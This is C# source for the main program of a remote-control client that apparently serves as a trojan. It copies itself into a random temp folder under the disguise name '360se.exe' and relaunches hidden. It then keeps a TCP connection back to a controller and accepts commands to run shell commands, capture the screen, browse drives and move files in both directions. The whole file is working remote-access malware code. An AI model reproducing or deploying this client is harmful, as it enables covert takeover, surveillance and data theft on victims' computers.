using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Threading;
using RemoteControl.Protocals;
using System.Windows.Forms;
using RemoteControl.Protocals.Utilities;
using System.Net;
using System.Runtime.InteropServices;
using RemoteControl.Protocals.Response;
using RemoteControl.Client.Handlers;
using RemoteControl.Client.Utils;
using RemoteControl.Protocals.Codec;

namespace RemoteControl.Client
{
    class Program
    {
        private static Socket oServer;
        private static bool isTestMode = false;
        private static bool isClosing = false;
        private static Thread heartbeatThread = null;

        static Program()
        {
            AssemblyLoader.Register("Newtonsoft.Json.Lite", "RemoteControl.Client.Loaders.Newtonsoft.Json.Lite.dll.zip");
            AssemblyLoader.Register("RemoteControl.Protocals", "RemoteControl.Client.Loaders.RemoteControl.Protocals.dll.zip");
            AssemblyLoader.Attach();
        }

        static void Main(string[] args)
        {
            if (args.Length == 1 && args[0].StartsWith("/delay:"))
            {
                string str = args[0].Substring("/delay:".Length);
                int delay = Convert.ToInt32(str);
                Thread.Sleep(delay);
                args = new string[]{};
            }
            if (args.Length == 0)
            {
                // 进行安装操作
                string sourceFilePath = System.Reflection.Assembly.GetEntryAssembly().Location;
                var destinationFileDir = Environment.GetEnvironmentVariable("temp") + "\\" + Guid.NewGuid().ToString();
                if (!System.IO.Directory.Exists(destinationFileDir))
                {
                    System.IO.Directory.CreateDirectory(destinationFileDir);
                }
                string serviceName = "360se.exe";
                var paras = ReadParameters();
                if (!string.IsNullOrWhiteSpace(paras.ServiceName))
                {
                    serviceName = paras.ServiceName;
                }
                var destinationFilePath = destinationFileDir + "\\" + serviceName;
                System.IO.File.Copy(sourceFilePath, destinationFilePath, true);
                var t = ProcessUtil.Run(destinationFilePath, "/r", true, false);
                t.Join();
                return;
            }
            else if (args.Length == 1)
            {
                if (args[0] == "/r")
                {
                    InitHandlers();
                    StartConnect();
                    heartbeatThread = new Thread(() => StartHeartbeat()) {IsBackground = true};
                    heartbeatThread.Start();
                    StartMonitor();
                }
            }
        }

        static Dictionary<ePacketType, IRequestHandler> InitHandlers()
        {
            var handlers = new Dictionary<ePacketType, IRequestHandler>();
            handlers.Add(ePacketType.PACKET_GET_DRIVES_REQUEST, new RequestGetDrivesHandler());
            handlers.Add(ePacketType.PACKET_GET_SUBFILES_OR_DIRS_REQUEST, new RequestGetSubFilesOrDirsHandler());
            handlers.Add(ePacketType.PACKET_COMMAND_REQUEST, new RequestCommandHandler());
            RequestCaptureScreenHandler captureScreenHandler = new RequestCaptureScreenHandler();
            handlers.Add(ePacketType.PACKET_START_CAPTURE_SCREEN_REQUEST, captureScreenHandler);
            handlers.Add(ePacketType.PACKET_STOP_CAPTURE_SCREEN_REQUEST, captureScreenHandler);
            RequestDownloadHandler downloadHandler = new RequestDownloadHandler();
            handlers.Add(ePacketType.PACKET_START_DOWNLOAD_REQUEST, downloadHandler);
            handlers.Add(ePacketType.PACKET_STOP_DOWNLOAD_REQUEST, downloadHandler);
            handlers.Add(ePacketType.PACKET_OPEN_FILE_REQUEST, new RequestOpenFileHandler());
            RequestUploadHandler uploadHandler = new RequestUploadHandler();
            handlers.Add(ePacketType.PACKET_START_UPLOAD_HEADER_REQUEST, uploadHandler);
            handlers.Add(ePacketType.PACKET_START_UPLOAD_RESPONSE, uploadHandler);
            handlers.Add(ePacketType.PACKET_STOP_UPLOAD_REQUEST, uploadHandler);

            return handlers;
        }

        static ClientParameters ReadParameters()
        {
            ClientParameters paras = new ClientParameters();
            if (isTestMode)
            {
                paras.SetServerIP("192.168.1.136");
                paras.ServerPort = 10086;
                paras.OnlineAvatar = "";
                paras.ServiceName = "";
            }
            else
            {
                string filePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                paras = ClientParametersManager.ReadParameters(filePath); 
            }
            Console.WriteLine("参数信息：");
            Console.WriteLine("IP:" + paras.GetServerIP());
            Console.WriteLine("PORT：" + paras.ServerPort);

            return paras;
        }

        static void StartConnect()
        {
            var paras = ReadParameters();
            var handlers = InitHandlers();
            while (true)
            {
                try
                {
                    DoOutput("正在连接服务器...");
                    oServer = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    oServer.Connect(paras.GetIPEndPoint());
                    DoOutput("服务器连接成功！");

                    var oServerSession = new SocketSession(oServer.RemoteEndPoint.ToString(), oServer);
                    StartRecvData(oServerSession,handlers);
                    break;
                }
                catch (Exception ex)
                {
                    Console.WriteLine("连接服务器异常，" + ex.Message);
                }
                Thread.Sleep(3000);
            }
        }

        static void StartRecvData(SocketSession session, Dictionary<ePacketType, IRequestHandler> handlers)
        {
            var paras = ReadParameters();
            // 获取主机名，并告诉服务器
            ResponseGetHostName resp = new ResponseGetHostName();
            resp.HostName = Dns.GetHostName();
            resp.AppPath = Application.ExecutablePath;
            resp.OnlineAvatar = paras.OnlineAvatar;
            session.Send(ePacketType.PACKET_GET_HOST_NAME_RESPONSE, resp);

            new Thread(() =>
            {
                byte[] buffer = new byte[1024];
                int recvSize = -1;
                List<byte> data = new List<byte>();
                while (true)
                {
                    try
                    {
                        recvSize = session.SocketObj.Receive(buffer);
                        if (recvSize < 0)
                            continue;

                        for (int i = 0; i < recvSize; i++)
                        {
                            data.Add(buffer[i]);
                        }
                        while (data.Count >= 4)
                        {
                            int packetLength = BitConverter.ToInt32(data.ToArray(), 0);
                            if (data.Count >= packetLength)
                            {
                                DoRecvBytes(session, data.SplitBytes(0, packetLength),handlers);
                                data.RemoveRange(0, packetLength);
                            }
                            else
                            {
                                break;
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        break;
                    }
                }
            }) { IsBackground = true }.Start();
        }

        static void DoRecvBytes(SocketSession session, byte[] packet, Dictionary<ePacketType, IRequestHandler> handlers)
        {
            ePacketType packetType;
            object obj;
            CodecFactory.Instance.DecodeObject(packet, out packetType, out obj);
            Console.WriteLine(packetType.ToString());

            if (handlers.ContainsKey(packetType))
            {
                handlers[packetType].Handle(session, packetType, obj);
            }
        }

        static void StartHeartbeat()
        {
            while (true)
            {
                if (isClosing)
                {
                    break;
                }
                try
                {
                    if (oServer != null)
                    {
                        byte[] packet = CodecFactory.Instance.EncodeOject(ePacketType.PACKET_HEART_BEAR, null);
                        oServer.Send(packet);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("心跳发送异常，" + ex.Message);
                    StartConnect();
                }
                Thread.Sleep(3000);
            }

        }

        static void StartMonitor()
        {
            while (true)
            {
                Thread.Sleep(1000);
            }
        }

        static void DoOutput(string sMsg)
        {
            Console.WriteLine("{0} {1}", DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"), sMsg);
        }
    }
}
